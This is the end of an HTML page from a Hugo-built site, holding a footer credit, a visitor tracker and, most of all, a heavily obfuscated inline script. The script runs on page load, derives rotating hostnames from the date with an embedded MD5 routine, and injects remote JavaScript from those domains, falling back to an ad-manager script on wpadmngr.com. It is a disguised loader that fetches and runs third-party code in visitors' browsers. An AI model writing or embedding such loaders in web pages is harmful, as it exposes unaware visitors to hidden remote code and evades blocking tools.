			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>